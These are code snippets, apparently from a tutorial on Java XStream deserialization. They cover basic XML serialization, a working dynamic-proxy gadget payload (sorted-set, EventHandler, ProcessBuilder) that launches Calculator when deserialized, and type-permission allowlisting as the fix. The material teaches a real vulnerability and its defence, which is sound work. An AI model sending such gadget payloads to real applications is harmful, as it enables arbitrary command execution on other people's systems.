["```\r\npublic class Person {\r\n    private String first;\r\n    private String last;\r\n\r\n    // standard getters and setters\r\n}\r\n```","```\r\nXStream xstream = new XStream();\r\nString xml = xstream.toXML(person);\r\n```","```\r\nXStream xstream = new XStream();\r\nxstream.alias(\"person\", Person.class);\r\nString xml = \"<person><first>John</first><last>Smith</last></person>\";\r\nPerson person = (Person) xstream.fromXML(xml);\r\n```","```\r\nString xml = \"\" \r\n    + \"<map>\" \r\n    + \"  <element>\" \r\n    + \"    <string>foo</string>\" \r\n    + \"    <int>10</int>\" \r\n    + \"  </element>\" \r\n    + \"</map>\";\r\nXStream xStream = new XStream();\r\nMap<String, Integer> map = (Map<String, Integer>) xStream.fromXML(xml); \r\n```","```\r\nnew ProcessBuilder().command(\"executable-name-here\").start();\r\n```","```\r\n<dynamic-proxy>\r\n    <interface>java.lang.Comparable</interface>\r\n    <handler class=\"java.beans.EventHandler\">\r\n        <target class=\"java.lang.ProcessBuilder\">\r\n            <command>\r\n                <string>open</string>\r\n                <string>/Applications/Calculator.app</string>\r\n            </command>\r\n        </target>\r\n        <action>start</action>\r\n    </handler>\r\n</dynamic-proxy>\r\n```","```\r\n<sorted-set>\r\n    <string>foo</string>\r\n    <dynamic-proxy>\r\n        <interface>java.lang.Comparable</interface>\r\n        <handler class=\"java.beans.EventHandler\">\r\n            <target class=\"java.lang.ProcessBuilder\">\r\n                <command>\r\n                    <string>open</string>\r\n                    <string>/Applications/Calculator.app</string>\r\n                </command>\r\n            </target>\r\n            <action>start</action>\r\n        </handler>\r\n    </dynamic-proxy>\r\n</sorted-set> \r\n```","```\r\nString sortedSortAttack = // XML from above\r\nXStream xstream = new XStream();\r\nPerson person = (Person) xstream.fromXML(sortedSortAttack);\r\n```","```\r\nXStream xstream = new XStream();\r\nxstream.addPermission(NoTypePermission.NONE);\r\nxstream.addPermission(NullPermission.NULL);\r\nxstream.addPermission(PrimitiveTypePermission.PRIMITIVES);\r\nxstream.allowTypes(new Class<?>[] { Person.class });\r\n```"]